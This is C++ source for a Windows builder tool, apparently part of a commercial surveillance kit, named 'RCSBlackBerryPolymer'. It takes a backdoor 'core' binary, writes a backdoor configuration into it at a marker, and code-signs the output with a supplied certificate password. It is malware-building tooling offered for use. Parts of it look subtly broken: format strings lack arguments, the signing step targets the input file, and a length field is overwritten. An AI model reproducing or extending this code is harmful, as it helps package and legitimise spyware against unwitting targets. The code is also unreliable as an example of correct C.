
#include "stdafx.h"
#include <Windows.h>
#include <openssl\md5.h>
#include "polymer.h"
#include "fileutils.h"

#define CONFIG_MARK_LEN 64

bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);

extern BOOL SignCod(TCHAR *wsFile, TCHAR *wsKey);

BYTE CONFIG_MARK[64] = {
    0x85, 0x22, 0xA0, 0x14, 0x28, 0x09, 0x55, 0xEC,
    0xB7, 0xF8, 0xA5, 0x6D, 0x87, 0x86, 0xC8, 0x3F,
    0x62, 0xAF, 0x91, 0x2C, 0xFB, 0xCE, 0x72, 0xBB,
    0x80, 0xF3, 0x28, 0x7F, 0xE0, 0x1D, 0x07, 0x64,
    0x0E, 0x94, 0x22, 0x21, 0xCA, 0x85, 0xA8, 0xA3,
    0x6A, 0x00, 0xD6, 0x0E, 0xB5, 0xA5, 0x15, 0xD8,
    0x80, 0x9C, 0x47, 0xBE, 0x4B, 0xAC, 0x8F, 0x11,
    0x8D, 0xC0, 0xDE, 0x2C, 0xF1, 0xA4, 0xA3, 0x41 
};

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hFile;
	BYTE *pBlockPtr	= NULL;
	BYTE *pConfigPtr = NULL;
	WCHAR wsCertPass[MAX_PATH];
	WCHAR wsCoreFile[MAX_PATH];
	WCHAR wsConfigFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	WCHAR wsCSKFile[MAX_PATH];
	WCHAR wsDBFile[MAX_PATH];
	WCHAR wsSETFile[MAX_PATH];
	unsigned int iLen = 0;
	unsigned int iConfigLen = 0;

	if (argc != 5) {
		printf("ERROR: \n");
		printf("  usage:  RCSBlackBerryPolymer.exe  <core> <config> <cert_pass> <output>\n\n");
		printf("  <core> is the core already polymerized\n");
		printf("  <config> is the backdoor configuration\n");
		printf("  <cert_pass> is the private key of the certificate\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}

	wsprintf(wsCoreFile, L"%s", argv[1]);
	wsprintf(wsConfigFile, L"%s", argv[2]);
	wsprintf(wsCertPass, L"%s", argv[3]);
	wsprintf(wsOutFile, L"%s", argv[4]);	

	wsprintf(wsCSKFile, L"%s");	
	wsprintf(wsDBFile, L"%s");	
	wsprintf(wsSETFile, L"%s");	

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/

	if ( (hFile = CreateFile(wsCoreFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find core file [%S]\n", wsCoreFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsConfigFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find config file [%S]\n", wsConfigFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsCSKFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find cert file [%S]\n", wsCSKFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsDBFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find cert file [%S]\n", wsDBFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsSETFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find cert file [%S]\n", wsSETFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("CONFIG FILE   [%S]\n", wsConfigFile);
	printf("CERT PASS     [%S]\n", wsCertPass);
	printf("INPUT CORE    [%S]\n", wsCoreFile);
	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);

	if (CopyFile(wsCoreFile, wsOutFile, FALSE) == FALSE) {
		printf("Cannot create output file[%S]\n", wsOutFile);
		return ERROR_OUTPUT;
	}

	/************************************************************************/
	/* BINARY PATCHING                                                      */
	/************************************************************************/

	BYTE bufmd5[MD5_DIGEST_LENGTH];

	pBlockPtr = (BYTE *) LoadFile(wsOutFile, &iLen);
	pConfigPtr = (BYTE *) LoadFile(CONFIG_FILENAME, &iConfigLen );

	if(pBlockPtr == NULL){
		printf("Cannot open out file... ok\n");
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	if(pConfigPtr == NULL){
		printf("Cannot open config file... ok\n");
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching della configurazione

	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) pConfigPtr, iConfigLen, CONFIG_MARK, CONFIG_MARK_LEN))
		printf("Config name embedded... ok\n");
	else {
		printf("Cannot embed Config Name [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	UnloadFile(pBlockPtr);
	UnloadFile(pConfigPtr);

	/************************************************************************/
	/* SIGNING                                                              */
	/************************************************************************/


	if (SignCod(wsCoreFile, wsCertPass))
		printf("Using the certificate to sign the code... ok\n");
	else {
		printf("Cannot sign with the certificate file [%S][%S]\n", wsCoreFile, wsCertPass);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	printf("Output file... ok\n");


	return ERROR_SUCCESS;
}


// cerca in pBlockPtr il marker mark_b, quando lo trova scrive block per la sua lunghezza
bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
{
	BYTE *pDataSect	= NULL;
	bool iRet = false;

	pDataSect = pBlockPtr;

	if( pBlockPtr == NULL )
		return false;

	__try {
		while(  pBlockPtr < (pDataSect + iLen) ) {

			if( !memcmp(pBlockPtr,mark_b, mark_len) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}

	if( pBlockPtr  && (pBlockPtr < ( pDataSect + iLen - 1 ) )   ) {

		memset(pBlockPtr, 0, (int)mark_len);
		memcpy(pBlockPtr, (char*)&block_len, sizeof(int));
		memcpy(pBlockPtr, block+sizeof(int), (int)block_len);

		iRet = true;

	} else 
		iRet = false;

	return iRet;
}

